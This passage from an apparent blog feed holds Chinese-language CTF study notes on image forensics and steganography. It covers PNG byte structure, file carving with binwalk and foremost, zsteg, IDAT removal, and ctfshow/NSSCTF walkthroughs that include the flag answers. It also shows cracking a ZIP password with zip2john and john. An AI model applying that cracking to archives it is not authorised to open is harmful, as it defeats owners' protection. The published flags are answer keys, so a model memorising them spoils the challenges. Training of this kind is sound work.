1e9f  .`P....O..r.$... 00000e0: cff7 b9ae ae4e 4c4e 4eda 3299 4c00 777c  .....NLNN.2.L.w| 00000f0: 5f4c 1472 16f9 9a07 2e6a 6b6b 875a 5b5b  _L.r.....jkk.Z[[ 0000100: 454d 4d8d e8ea ea7a 4eff 3ce2 8ea2 3018  EMM....zN.&lt;...0. 0000110: 94cb c28a 7f04 765f d3b4 27ec d0d8 d8a8  ......v_..&#39;..... 0000120: 5655 55bd 639b 9201 a8b6 a8af 516b 9bcd  VUU.c.......Qk.. 0000130: 26ca caca f46f 0020 7bb7 db6d 38d8 ed76  &amp;....o. &#123;..m8..v 0000140: d1d1 d1f1 82ee 34d8 940c 0023 00c2 11e0  ......4....#.... 0000150: 1c20 975d 2781 3d75 381c 379c 9a9b 9b55  . .]&#39;.=u8.7....U 0000160: 2ad7 1012 bb73 0028 c073 1373 8f02 3c68  *....s.(.s.s..&lt;h 0000170: 6b6b fb44 25b9 e554 5e5e 2eba bbbb f18a  kk.D%..T^^...... 0000180: c791 4844 2b16 c012 0e87 fd04 faac bebe  ..HD+........... 0000190: be85 cad1 e272 b97c 04a0 e245 4ea7 530f  .....r.|...EN.S. 00001a0: 5c48 8e8f 8f45 3a9d d6f5 f0f0 7091 747b  \H...E:.....p.t&#123; 00001b0: 7777 779d feff a649 0b07 0281 acb5 baba  www....I........ 00001c0: fa97 dfef 7710 7041 309e 2c79 ba20 4800  ....w.pA0.,y. H. 00001d0: 9a13 2f81 7a11 7479 79b9 3f16 8ba1 ae63  ../.z.tyy.?....c 00001e0: caf9 f979 120b 83c5 81e6 03e3 8e4f 59e5  ...y.........OY. 00001f0: a010 5e3c f405 2705 dbd6 7b90 4aa5 1ecd  ..^&lt;..&#39;...&#123;.J... 0000200: cdcd 250e 0e0e c4c5 c585 a080 fa49 0686  ..%..........I.. 0000210: 1303 ca81 7007 1bf6 c1f7 d9d9 9958 5b5b  ....p........X[[ 0000220: 1384 f73a 140a 7de3 3d58 27e9 8d46 a371  ...:..&#125;.=X&#39;..F.q 0000230: 0491 c14a 89fc 1204 01f8 d4d4 1461 87be  ...J.........a.. 0000240: e46f 7262 6363 a377 6666 6671 6f6f cfc8  .orbcc.wfffqoo.. 0000250: dc6c cb65 651b 3439 1e8f 03bc 8fc0 c70a  .l.ee.49........ 0000260: 5145 3291 483c 5c58 5888 a251 a5c0 5989  QE2.H&lt;\XX..Q..Y. 0000270: f8c4 d6d6 5676 7a7a fae5 c0c0 c0f8 ad3d  ....Vvzz.......= 0000280: c823 ac14 3df3 c3d1 d191 d1e4 620a 5f94  .#..=.......b._. 0000290: 6673 7333 3238 38f8 b520 9be6 3887 ff79  fss3288.. ..8..y 00002a0: 989b f85f 7e3f e4a4 b0f1 74af 1525 3b36  ..._~?....t..%;6 00002b0: 8423 ed45 6745 4585 012c 4f92 3c41 fc02  .#.EgEE..,O.&lt;A.. 00002c0: d008 ed90 7774 74d4 5694 4df9 248e f182  ....wtt.V.M.$... 00002d0: 3278 4ccd 9aca 8161 039f caca 4a80 9b52  2xL....a....J..R 00002e0: b855 1e49 3a55 32f6 c209 60bc 4068 3aa6  .U.I:U2...`.@h:. 00002f0: 8b1a 9aa6 041c 4429 3a6f 7150 3000 9d9d  ......D):oqP0... 0000300: 641e 33ed 8114 a485 0238 4178 703c 3939  d.3......8Axp&lt;99 0000310: 11c9 6452 acac acfc 248e 798b 9d21 b0e1  ..dR....$.y..!.. 0000320: f6f6 f6fe a6a6 2683 5ec0 5b94 948f eec3  ......&amp;.^.[..... 0000330: 055f c001 3015 5838 64bc baba 1add d9d9  ._..0.X8d....... 0000340: 01f0 0f76 a0cd 7d33 3f3f 3f42 73ff d1e3  ...v..&#125;3???Bs... 0000350: f104 1b1a 1a54 f890 6805 a748 9a92 3fb4  .....T..h..H..?. 0000360: e6df 691f dcfb fbfb 2366 19e5 64fb f4f4  ..i.....#f..d... 0000370: b46f 7676 7664 6969 6998 5ed1 43fd 1837  .ovvvdiii.^.C..7 0000380: a5eb bb50 c2bf 8822 feb3 fc15 6000 74fe  ...P...&quot;....`.t. 0000390: 7622 c159 82da 0000 0000 4945 4e44 ae42  v&quot;.Y......IEND.B 00003a0: 6082 0a                                  `.. </code>  |<br>| — | — |</p><p><font style="color:rgb(77, 77, 77);">接下来我们试着分析一下：</font></p><p><font style="color:rgb(77, 77, 77);">首先是八个字节的文件头标志，标识着png文件：</font></p><table><thead><tr><th><code>plain 1 </code></th><th><code>plain 8950 4e47 0d0a 1a0a </code></th></tr></thead></table><p><font style="color:rgb(77, 77, 77);">接下来的地方就是IHDR数据块了：</font></p><p><font style="color:rgb(77, 77, 77);">0000 000d</font><font style="color:rgb(77, 77, 77);">说明IHDR头块长为13</font></p><p><font style="color:rgb(77, 77, 77);">4948 4452</font><font style="color:rgb(77, 77, 77);">IHDR标识（ascii码为IHDR）</font></p><p><font style="color:rgb(77, 77, 77);">下面是IHDR数据块的实际内容</font></p><p><font style="color:rgb(77, 77, 77);">0000 0018</font><font style="color:rgb(77, 77, 77);">图像的宽，24像素</font></p><p><font style="color:rgb(77, 77, 77);">0000 0018</font><font style="color:rgb(77, 77, 77);">图像的高，24像素</font></p><p><font style="color:rgb(77, 77, 77);">08</font><font style="color:rgb(77, 77, 77);"> 表示色深，这里是2^8&#x3D;256，即这是一个256色的图像</font></p><p><font style="color:rgb(77, 77, 77);">06</font><font style="color:rgb(77, 77, 77);"> 颜色类型，查表可知这是带α通道数据的真彩色图像</font></p><p><font style="color:rgb(77, 77, 77);">00</font><font style="color:rgb(77, 77, 77);"> PNG Spec规定此处总为0（非0值为将来使用更好的压缩方法预留），表示使压缩方法(LZ77派生算法)</font></p><p><font style="color:rgb(77, 77, 77);">00</font><font style="color:rgb(77, 77, 77);"> 同上</font></p><p><font style="color:rgb(77, 77, 77);">00</font><font style="color:rgb(77, 77, 77);"> 非隔行扫描</font></p><p><font style="color:rgb(77, 77, 77);">e0 773d f8</font><font style="color:rgb(77, 77, 77);"> CRC校验</font></p><p><font style="color:rgb(77, 77, 77);">以上分析了第一个IHDR块的内容，其他块的分析方法类似，比如接下来的就是tEXt块了，很简单，不做分析了。（当然这里还有重要的IDAT块，这是图像的实际内容）</font></p><p><font style="color:rgb(77, 77, 77);">最后得有个IEND数据块，这部分正如上所说，通常都应该是</font></p><p><font style="color:rgb(77, 77, 77);">00 00 00 00 49 45 4E 44 AE 42 60 82</font></p><p><font style="color:rgb(77, 77, 77);">由于我用的是vim打开，vim在文件最后都会恶心的自己加上0a换行，当然这并没有什么坏的影响。不过这也提醒了我们一个问题，既然在IEND块后面添加任何的字符都对文件的打开造成不了影响，那我们就可以在这里藏一些数据了（当然这种藏法很low）。。。</font></p><p><font style="color:rgb(77, 77, 77);">OK，这就是png文件的基本构造了。</font></p><h2 id="例题：可能会修改文件名"><a href="#例题：可能会修改文件名" class="headerlink" title="例题：可能会修改文件名"></a><font style="color:rgb(77, 77, 77);">例题：可能会修改文件名</font></h2><p><img src="/./img/49277317_Y7IwpiPMo_LbkTHd/1715249478476-fc4500f4-d179-4a9e-8ca3-b739743ed423-487554.png" alt="1715249478476-fc4500f4-d179-4a9e-8ca3-b739743ed423.png"></p><p>可能是头文件出问题</p><p><img src="/./img/49277317_Y7IwpiPMo_LbkTHd/1715249511415-c2ce3779-2cd3-4e8f-bf8a-75c7641c71f1-452248.png" alt="1715249511415-c2ce3779-2cd3-4e8f-bf8a-75c7641c71f1.png"></p><p>看上面的8个字节头文件标志</p><p>89 50 4E 47 0D 0A 1A 0A</p><p>改完就可以打开图片了</p><h1 id="文件结构-1"><a href="#文件结构-1" class="headerlink" title="文件结构"></a>文件结构</h1><h3 id="JPG-FFD8FF-FFD9"><a href="#JPG-FFD8FF-FFD9" class="headerlink" title="JPG FFD8FF   FFD9"></a>JPG FFD8FF   FFD9</h3><h3 id="PNG-89-50-4E-47-0D-0A-1A-0A"><a href="#PNG-89-50-4E-47-0D-0A-1A-0A" class="headerlink" title="PNG 89 50 4E 47 0D 0A 1A 0A"></a>PNG 89 50 4E 47 0D 0A 1A 0A</h3><h2 id="文件的使用"><a href="#文件的使用" class="headerlink" title="文件的使用"></a>文件的使用</h2><p>Qr_research</p><p>Stegsolve</p><p>Winhex10</p><p>各种隐写、爆破脚本</p><h2 id="猜测出题人的思路"><a href="#猜测出题人的思路" class="headerlink" title="猜测出题人的思路"></a>猜测出题人的思路</h2><h2 id="CTF常见套路"><a href="#CTF常见套路" class="headerlink" title="CTF常见套路"></a>CTF常见套路</h2><p>附加字符串</p><p>字符串隐藏在图片中</p><p>使用strings命令查看</p><p>string 1.jpg</p><h1 id="kali工具使用"><a href="#kali工具使用" class="headerlink" title="kali工具使用"></a>kali工具使用</h1><h2 id="binwalk使用"><a href="#binwalk使用" class="headerlink" title="binwalk使用"></a>binwalk使用</h2><p><font style="color:rgb(77, 77, 77);">从表面上来看这只是一个普通的文件，所以我们通过binwalk工具观察这个图片中是否有隐藏文件</font></p><p><img src="/./img/49277317_Y7IwpiPMo_LbkTHd/1721534712007-da04c1a2-5b4e-4d4b-935e-935702e94f33-078567.jpeg" alt="1721534712007-da04c1a2-5b4e-4d4b-935e-935702e94f33.jpeg"></p><h3 id="通过binwalk观察图片里面是否包含其他文件"><a href="#通过binwalk观察图片里面是否包含其他文件" class="headerlink" title="通过binwalk观察图片里面是否包含其他文件"></a>通过binwalk观察图片里面是否包含其他文件</h3><p><img src="/./img/49277317_Y7IwpiPMo_LbkTHd/1721534742420-e0aae4c9-c3d6-4be8-9c97-38cd606e9676-939587.png" alt="1721534742420-e0aae4c9-c3d6-4be8-9c97-38cd606e9676.png"></p><p><font style="color:rgb(77, 77, 77);">通过图片我们可以发现，图片中还隐藏了一个zip文件，因此我们要将zip文件提取出来。</font></p><h2 id="foremost的使用"><a href="#foremost的使用" class="headerlink" title="foremost的使用"></a><font style="color:rgb(77, 77, 77);">foremost的使用</font></h2><h3 id="通过foremost工具将隐藏文件提取出来"><a href="#通过foremost工具将隐藏文件提取出来" class="headerlink" title="通过foremost工具将隐藏文件提取出来"></a><font style="color:rgb(79, 79, 79);">通过foremost工具将隐藏文件提取出来</font></h3><p><font style="color:rgb(77, 77, 77);">Kali Linux提供一款还原专用工具Foremost。该工具通过分析不同类型文件的头、尾和内部数据结构，同镜像文件的数据进行比对，以还原文件。</font></p><p><img src="/./img/49277317_Y7IwpiPMo_LbkTHd/1721534817317-58e0778d-d41d-47c9-85a2-0daa18ac8ef7-090734.png" alt="1721534817317-58e0778d-d41d-47c9-85a2-0daa18ac8ef7.png"></p><p><font style="color:rgb(77, 77, 77);">foremost命令会在当前文件夹下生成一个output文件夹，我们打开output文件夹可以看见有三个文件：</font></p><p><img src="/./img/49277317_Y7IwpiPMo_LbkTHd/1721534867048-cfb35324-ef76-4b05-a0f6-27d95d489e8a-550528.png" alt="1721534867048-cfb35324-ef76-4b05-a0f6-27d95d489e8a.png"></p><p><font style="color:rgb(77, 77, 77);">其中的jpg文件夹里面就是我们刚才看到的图片。zip文件夹下存放了一个压缩包，我们点击这个压缩包，发现里面存放了一个flag.txt，我们想要寻找的flag信息应该就存放在这个flag下面。之后我们点击flag.txt，发现需要密码：</font></p><p><img src="/./img/49277317_Y7IwpiPMo_LbkTHd/1721534882149-2d12eb22-371b-4abb-ac4d-d1d27b38046d-920547.png" alt="1721534882149-2d12eb22-371b-4abb-ac4d-d1d27b38046d.png"></p><p><font style="color:rgb(77, 77, 77);">这时我们需要通过zip2john工具进行解码</font></p><h2 id="zip2join的使用"><a href="#zip2join的使用" class="headerlink" title="zip2join的使用"></a><font style="color:rgb(77, 77, 77);">zip2join的使用</font></h2><h3 id="通过zip2john工具破解压缩包的密码"><a href="#通过zip2john工具破解压缩包的密码" class="headerlink" title="通过zip2john工具破解压缩包的密码"></a><font style="color:rgb(79, 79, 79);">通过zip2john工具破解压缩包的密码</font></h3><p><font style="color:rgb(77, 77, 77);">刚才我们通过foremost工具将zip文件提取出来之后，解压zip文件的时候，发现文件有密码，首先输入如下命令：</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">zip2john ./output/zip/00000159.zip password.txt<br></code></pre></td></tr></table></figure><ul><li><code>zip2john</code>：从 ZIP 文件中提取哈希。</li><li><code>./output/zip/00000159.zip</code>：要提取的 ZIP 文件路径。</li><li><code>&gt; password.txt</code>：将输出重定向到 <code>password.txt</code> 文件。</li></ul><p><font style="color:rgb(77, 77, 77);">得到password.txt文件，再输入如下命令：</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">john password.txt<br></code></pre></td></tr></table></figure><p><font style="color:rgb(77, 77, 77);">我们便可以看到破解出来的密码：</font></p><p><img src="/./img/49277317_Y7IwpiPMo_LbkTHd/1721535104886-aa7f80f0-ec51-47c0-bf5b-80453a32486e-224289.png" alt="1721535104886-aa7f80f0-ec51-47c0-bf5b-80453a32486e.png"></p><p><font style="color:rgb(77, 77, 77);">之后我们按照给出的密码解压文件，便可以看到flag信息：</font></p><p><img src="/./img/49277317_Y7IwpiPMo_LbkTHd/1721535117087-9c372e07-09f5-468d-a805-bec799a41f0d-616416.png" alt="1721535117087-9c372e07-09f5-468d-a805-bec799a41f0d.png"></p><h2 id="zsteg的使用"><a href="#zsteg的使用" class="headerlink" title="zsteg的使用"></a>zsteg的使用</h2><p><a href="https://blog.csdn.net/weixin_52941926/article/details/121536324">一个比StegSolve更方便的工具—zsteg-CSDN博客</a></p><p><font style="color:rgb(33, 37, 41);">根据题目提示，flag在图片数据中，我们用刚下载的zsteg，</font></p><p><font style="color:rgb(33, 37, 41);">用这个命令：（zsteg misc17.png ） , </font></p><p><img src="/./img/49277317_Y7IwpiPMo_LbkTHd/1722229616462-a9951747-cbf4-4ddc-80ed-aab4cbe27f13-968397.png" alt="1722229616462-a9951747-cbf4-4ddc-80ed-aab4cbe27f13.png"></p><p><font style="color:rgb(33, 37, 41);">然后我们用zsteg提取文件名为flag.txt，</font></p><p><font style="color:rgb(33, 37, 41);">具体命令是：（zsteg -e extradata:0 misc17.png &gt; flag.txt ） ，</font></p><p><font style="color:rgb(33, 37, 41);"> 我们查看flag.txt，里面什么也没有，</font></p><p><img src="/./img/49277317_Y7IwpiPMo_LbkTHd/1722229641546-ec2c771e-f038-454b-ad30-9059ba9bf492-285667.png" alt="1722229641546-ec2c771e-f038-454b-ad30-9059ba9bf492.png"></p><p><font style="color:rgb(33, 37, 41);">我们再次用binwalk查看这个flag.txt文件用这个命令（binwalk flag.txt）,</font></p><p><img src="/./img/49277317_Y7IwpiPMo_LbkTHd/1722229659789-5e207ca4-08d0-4d91-8414-05f4a1b2c6b9-505080.png" alt="1722229659789-5e207ca4-08d0-4d91-8414-05f4a1b2c6b9.png"></p><p><font style="color:rgb(33, 37, 41);"> 然后我们再用binwalk去提取也就是这个命令（binwalk -e flag.txt ）， </font></p><p><font style="color:rgb(33, 37, 41);">如果命令报错，我们在后面加上这个（–run-as&#x3D;root）也就是（binwalk -e flag.txt –run-as&#x3D;root）这个命令。</font></p><p><img src="/./img/49277317_Y7IwpiPMo_LbkTHd/1722229707018-fc66d563-d22f-4dd9-a380-461395f614f6-378268.png" alt="1722229707018-fc66d563-d22f-4dd9-a380-461395f614f6.png"></p><p>ctfshow{0fe61fc42e8bbe55b9257d251749ae45}</p><p><font style="color:rgb(33, 37, 41);">补充：在那里写extradata:0是因为用zsteg查看misc17的隐藏数据时候发现了这个错误，以后要是还发现类似错误要记得改了这里。</font></p><h1 id="word隐写"><a href="#word隐写" class="headerlink" title="word隐写"></a>word隐写</h1><p><font style="color:rgb(33, 37, 41);">文件————选项——————隐藏文字</font></p><p><font style="color:rgb(33, 37, 41);">转换成txt文档也可以看到flag</font></p><p><img src="/./img/49277317_Y7IwpiPMo_LbkTHd/1715054146758-623905de-c1f4-4658-91ff-83bad4339b94-672976.png" alt="1715054146758-623905de-c1f4-4658-91ff-83bad4339b94.png"></p><h1 id="图片隐写图片-foremost"><a href="#图片隐写图片-foremost" class="headerlink" title="图片隐写图片 foremost"></a>图片隐写图片 foremost</h1><p>用winhex打开后搜索文件头</p><p>PNG 89504E47 AE426082</p><p><img src="/./img/49277317_Y7IwpiPMo_LbkTHd/1721534005331-039c8886-51a0-42b6-b33f-fbd0edb13b1f-785981.png" alt="1721534005331-039c8886-51a0-42b6-b33f-fbd0edb13b1f.png"></p><p>发现有两个png开头文件名，判断是图片隐写图片</p><p><font style="color:rgb(33, 37, 41);">使用kali中的binwalk工具可以进行查看，再使用foremost工具分离，即可获得flag</font></p><h2 id=""><a href="#" class="headerlink" title=""></a><img src="/./img/49277317_Y7IwpiPMo_LbkTHd/1721539254449-501db621-4cc5-4e99-a84d-b0975be3491c-892982.png" alt="1721539254449-501db621-4cc5-4e99-a84d-b0975be3491c.png"></h2><p><font style="color:rgb(77, 77, 77);">foremost命令会在当前文件夹下生成一个output文件夹，我们打开output文件夹可以看见有三个文件</font></p><p><img src="/./img/49277317_Y7IwpiPMo_LbkTHd/1721539350281-6cc0a2ec-2f7e-43f4-a2cb-0bfba9874791-851067.png" alt="1721539350281-6cc0a2ec-2f7e-43f4-a2cb-0bfba9874791.png"></p><p>png文件夹里面有两张png，其中就有我们的flag</p><p><img src="/./img/49277317_Y7IwpiPMo_LbkTHd/1721539382384-a70b6082-5773-4558-98b2-748130f2eaf0-069891.png" alt="1721539382384-a70b6082-5773-4558-98b2-748130f2eaf0.png"></p><p><img src="/./img/49277317_Y7IwpiPMo_LbkTHd/1721539469329-29d09708-cbe3-4d34-97e1-88a2a30c729e-403444.png" alt="1721539469329-29d09708-cbe3-4d34-97e1-88a2a30c729e.png"></p><p>ctfshow{1df0a9a3f709a2605803664b55783687}</p><h1 id="图片删除IDAT（Tweakpng）"><a href="#图片删除IDAT（Tweakpng）" class="headerlink" title="图片删除IDAT（Tweakpng）"></a>图片删除IDAT（Tweakpng）</h1><p><a href="https://xiazai.zol.com.cn/detail/47/460122.shtml">【TweakPNG下载】PNG图像浏览(TweakPNG) 1.4.5-ZOL软件下载</a></p><h1 id="图片宽高修改"><a href="#图片宽高修改" class="headerlink" title="图片宽高修改"></a>图片宽高修改</h1><h2 id="png-第二行"><a href="#png-第二行" class="headerlink" title="png 第二行"></a>png 第二行</h2><h2 id="jpg-ffc2后面3组"><a href="#jpg-ffc2后面3组" class="headerlink" title="jpg ffc2后面3组"></a>jpg ffc2后面3组</h2><p><img src="/./img/49277317_Y7IwpiPMo_LbkTHd/1729739496204-0fcf2c16-4829-4e7e-a8b9-6213666fde82-669171.png" alt="1729739496204-0fcf2c16-4829-4e7e-a8b9-6213666fde82.png"></p><p><img src="/./img/49277317_Y7IwpiPMo_LbkTHd/1729738671828-36a4e6be-4cfb-44ec-ad94-e8993c5de042-496226.png" alt="1729738671828-36a4e6be-4cfb-44ec-ad94-e8993c5de042.png"></p><h1 id="图片分类"><a href="#图片分类" class="headerlink" title="图片分类"></a>图片分类</h1><h2 id="png"><a href="#png" class="headerlink" title="png"></a>png</h2><h3 id="crc32爆破"><a href="#crc32爆破" class="headerlink" title="crc32爆破"></a>crc32爆破</h3><p><img src="/./img/49277317_Y7IwpiPMo_LbkTHd/1722418142230-f739c136-5ecc-4738-8168-c5424d2a09fd-800058.png" alt="1722418142230-f739c136-5ecc-4738-8168-c5424d2a09fd.png"></p><p><img src="/./img/49277317_Y7IwpiPMo_LbkTHd/1722418182473-67a01e3c-6e77-4885-a82f-4525676b312f-834533.png" alt="1722418182473-67a01e3c-6e77-4885-a82f-4525676b312f.png"></p><h1 id="ctfshow-misc入门"><a href="#ctfshow-misc入门" class="headerlink" title="ctfshow misc入门"></a>ctfshow misc入门</h1><h2 id="1、改后缀名"><a href="#1、改后缀名" class="headerlink" title="1、改后缀名"></a>1、改后缀名</h2><p>给了一个txt文件</p><p><img src="/./img/49277317_Y7IwpiPMo_LbkTHd/1721530867903-b160973e-73f3-48e2-8271-67395883788e-397458.png" alt="1721530867903-b160973e-73f3-48e2-8271-67395883788e.png"></p><p>看到开头是89 50 4E 47 0D 0A 1A 01,典型的png开头格式</p><p>非预期：看到后面有个ng，盲猜是png哈哈哈</p><p><img src="/./img/49277317_Y7IwpiPMo_LbkTHd/1721530970382-dc2b63e4-583c-4ee2-9de2-4643e620a363-148498.png" alt="1721530970382-dc2b63e4-583c-4ee2-9de2-4643e620a363.png"></p><p>修改后缀名后得到flag</p><p><img src="/./img/49277317_Y7IwpiPMo_LbkTHd/1721531075324-2af49cbd-7c82-4b7e-84e7-c89b7c9c0af5-338711.png" alt="1721531075324-2af49cbd-7c82-4b7e-84e7-c89b7c9c0af5.png"></p><p>ctfshow{6f66202f21ad22a2a19520cdd3f69e7b}</p><h2 id="2、图片附加"><a href="#2、图片附加" class="headerlink" title="2、图片附加"></a>2、图片附加</h2><p>放入winhex文本搜索，找一下flag</p><p>注意要改成ASCII</p><p><img src="/./img/49277317_Y7IwpiPMo_LbkTHd/1721533018558-200ec574-c30c-44b1-b59e-582e63e077fa-543321.png" alt="1721533018558-200ec574-c30c-44b1-b59e-582e63e077fa.png"></p><p><img src="/./img/49277317_Y7IwpiPMo_LbkTHd/1721532629177-f7b7ac2f-2653-4153-b0d5-e8017bc8b2bc-157668.png" alt="1721532629177-f7b7ac2f-2653-4153-b0d5-e8017bc8b2bc.png"></p><h2 id="3、misc10-binwalk"><a href="#3、misc10-binwalk" class="headerlink" title="3、misc10 binwalk"></a>3、misc10 binwalk</h2><p>用winhex打开后搜索文件头</p><h4 id="PNG-89504E47-AE426082"><a href="#PNG-89504E47-AE426082" class="headerlink" title="PNG 89504E47 AE426082"></a>PNG 89504E47 AE426082</h4><p>没搜到没关系</p><p><img src="/./img/49277317_Y7IwpiPMo_LbkTHd/1721552601695-f99eaca6-7241-45b9-8178-a894c4a0eee0-956843.png" alt="1721552601695-f99eaca6-7241-45b9-8178-a894c4a0eee0.png"></p><p>binwalk -e misc10.png</p><p><img src="/./img/49277317_Y7IwpiPMo_LbkTHd/1721552673915-609cbb49-5669-4cf7-92e7-39f9cca2bcc5-366071.png" alt="1721552673915-609cbb49-5669-4cf7-92e7-39f9cca2bcc5.png"></p><h2 id="4、misc11-tweakpng"><a href="#4、misc11-tweakpng" class="headerlink" title="4、misc11 tweakpng"></a>4、misc11 tweakpng</h2><p>用winhex打开搜索文件头8950</p><p><img src="/./img/49277317_Y7IwpiPMo_LbkTHd/1722153892231-5cdd1d87-5c1e-4d44-9457-cfb16f9f8f76-617566.png" alt="1722153892231-5cdd1d87-5c1e-4d44-9457-cfb16f9f8f76.png"></p><p>只有一次说明只有一张照片</p><p>用kali的binwalk看一下发现有两个文件，说明有隐藏文件</p><p><img src="/./img/49277317_Y7IwpiPMo_LbkTHd/1722154001851-09b4f908-068c-4ed1-8cfb-8f537bf3d992-199528.png" alt="1722154001851-09b4f908-068c-4ed1-8cfb-8f537bf3d992.png"></p><p><font style="color:rgb(77, 77, 77);">用 010 editor 打开，运行模板 png.bit ，看到图片有两个 IDAT 块。（前面一题 misc10 也有两个 IDAT 块）</font></p><p><img src="/./img/49277317_Y7IwpiPMo_LbkTHd/1722155299590-223a0034-b066-4ad8-9b54-6265cca526f1-933763.png" alt="1722155299590-223a0034-b066-4ad8-9b54-6265cca526f1.png"></p><p>放入tweakpng中删除第一个IDAT</p><p><font style="color:rgb(77, 77, 77);">用 tweakpng 打开图片，点击第一个 IDAT 块，右键选择删除。</font></p><p><img src="/./img/49277317_Y7IwpiPMo_LbkTHd/1722155333880-407a6ca3-474a-4351-a010-1c5f0c20e5e0-263033.png" alt="1722155333880-407a6ca3-474a-4351-a010-1c5f0c20e5e0.png"></p><p><font style="color:rgb(77, 77, 77);">保存之后，再打开图片就得到 flag 了。</font></p><p><img src="/./img/49277317_Y7IwpiPMo_LbkTHd/1722155366533-c5aeb149-1a24-4d61-81d1-0829fd13a00a-056898.png" alt="1722155366533-c5aeb149-1a24-4d61-81d1-0829fd13a00a.png"></p><p>ctfshow{44620176948fa759d3eeafeac99f1ce9}</p><h2 id="5、misc14-flag在图片里面"><a href="#5、misc14-flag在图片里面" class="headerlink" title="5、misc14 flag在图片里面"></a>5、misc14 flag在图片里面</h2><h3 id="使用命令：binwalk-e-misc14-jpg-有信息显示但是没有生成分离文件夹"><a href="#使用命令：binwalk-e-misc14-jpg-有信息显示但是没有生成分离文件夹" class="headerlink" title="使用命令：binwalk -e misc14.jpg 有信息显示但是没有生成分离文件夹"></a><font style="color:rgb(33, 37, 41);">使用命令：binwalk -e misc14.jpg 有信息显示但是没有生成分离文件夹</font></h3><h3 id="使用命令：binwalk-e-misc14-jpg-D-jpeg-–run-as-root-生成分离文件夹，获得flag"><a href="#使用命令：binwalk-e-misc14-jpg-D-jpeg-–run-as-root-生成分离文件夹，获得flag" class="headerlink" title="使用命令：binwalk -e misc14.jpg -D&#x3D;jpeg –run-as&#x3D;root 生成分离文件夹，获得flag"></a><font style="color:rgb(33, 37, 41);">使用命令：binwalk -e misc14.jpg -D&#x3D;jpeg –run-as&#x3D;root 生成分离文件夹，获得flag</font></h3><ul><li><code>-e</code> 或 <code>--extract</code>：提取文件中的嵌入数据。</li><li><code>-D=jpeg</code>：指定提取 JPEG 文件。</li><li><code>--run-as=root</code>：以 root 用户身份运行 <code>binwalk</code>。</li></ul><p><font style="color:rgb(33, 37, 41);">或者010Editor中查看jpeg文件文件头FF D8，文件尾巴FF D9，自己组合复制到新的16进制文件中，保存查看。</font></p><p><img src="/./img/49277317_Y7IwpiPMo_LbkTHd/1722226740367-4fc2cde2-6f55-40e5-a749-f755e45ba6a6-090904.png" alt="1722226740367-4fc2cde2-6f55-40e5-a749-f755e45ba6a6.png"></p><p><img src="/./img/49277317_Y7IwpiPMo_LbkTHd/1722227445187-6b1853cf-1ac0-44eb-913b-c53b8526863f-315949.jpeg" alt="1722227445187-6b1853cf-1ac0-44eb-913b-c53b8526863f.jpeg"></p><p>ctfshow{ce520f767fc465b0787cdb936363e694}</p><blockquote><p>更新: 2025-07-19 14:01:22<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/dxmqut5cbvgy266u">https://www.yuque.com/chaye-apqbl/vsc85q/dxmqut5cbvgy266u</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E7%85%A7%E7%89%87/%E5%9B%BE%E7%89%87%E4%BF%AE%E5%A4%8D/"/>
    <url>/2026/01/19/MISC/%E7%85%A7%E7%89%87/%E5%9B%BE%E7%89%87%E4%BF%AE%E5%A4%8D/</url>
    
    <content type="html"><![CDATA[<h1 id="图片修复"><a href="#图片修复" class="headerlink" title="图片修复"></a>图片修复</h1><h1 id="二维码特征图"><a href="#二维码特征图" class="headerlink" title="二维码特征图"></a>二维码特征图</h1><p><a href="https://www.yuque.com/attachments/yuque/0/2025/jpeg/42988179/1754460353969-32c6c84c-74c6-4274-9fb0-31aa3dcd0f58.jpeg">6ea50431fcfd447098ff50d43e341cd8.jpg</a></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/42988179/1754460403763-fc90a832-735e-4675-81ca-4f84d917935d.png"></p><h1 id="crc宽高修复"><a href="#crc宽高修复" class="headerlink" title="crc宽高修复"></a>crc宽高修复</h1><p><img src="/./img/49277317_8JbNPqaQJ1xUw4dq/1722418852200-7b993f45-1759-460b-83c0-ba5527519a17-273407.webp" alt="1722418852200-7b993f45-1759-460b-83c0-ba5527519a17.png"></p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="1、为什么我什么都看不见"><a href="#1、为什么我什么都看不见" class="headerlink" title="1、为什么我什么都看不见"></a>1、为什么我什么都看不见</h2><p>图片的文件头为89 50 4E 47</p><p><img src="/./img/49277317_8JbNPqaQJ1xUw4dq/1722323541805-55a5813f-566f-42b0-8e27-291ced8952d5-717388.png" alt="1722323541805-55a5813f-566f-42b0-8e27-291ced8952d5.png"></p><p>将前面的8950（p）修复即可</p><p><img src="/./img/49277317_8JbNPqaQJ1xUw4dq/1722323752350-9530fe07-53d4-411a-85a9-3aafbd367850-209067.png" alt="1722323752350-9530fe07-53d4-411a-85a9-3aafbd367850.png"><img src="/./img/49277317_8JbNPqaQJ1xUw4dq/1722323823997-e2d5e349-9dc2-439d-ba19-9e04bba10803-118526.png" alt="1722323823997-e2d5e349-9dc2-439d-ba19-9e04bba10803.png"><img src="/./img/49277317_8JbNPqaQJ1xUw4dq/1722323869716-b90937de-413c-4ab8-9677-7bdbb41b87b7-217910.png" alt="1722323869716-b90937de-413c-4ab8-9677-7bdbb41b87b7.png"></p><p>然后放到stegsolve里面将red green blue 都选为0，就能将flag解析出来了，记住将nisa{}换成NSSCTF{}，并删去空格</p><p><img src="/./img/49277317_8JbNPqaQJ1xUw4dq/1722323902731-d0efcabd-25ec-49ba-930d-cc4335b0e66b-023481.png" alt="1722323902731-d0efcabd-25ec-49ba-930d-cc4335b0e66b.png"></p><p>NSSCTF{Wlec0me_to_NiSa2022}</p><blockquote><p>更新: 2025-08-06 14:07:07<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/faag4s83ygc4eo67">https://www.yuque.com/chaye-apqbl/vsc85q/faag4s83ygc4eo67</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/MISC/%E7%85%A7%E7%89%87/%E4%BA%8C%E7%BB%B4%E7%A0%81%E6%8B%BC%E5%9B%BE/"/>
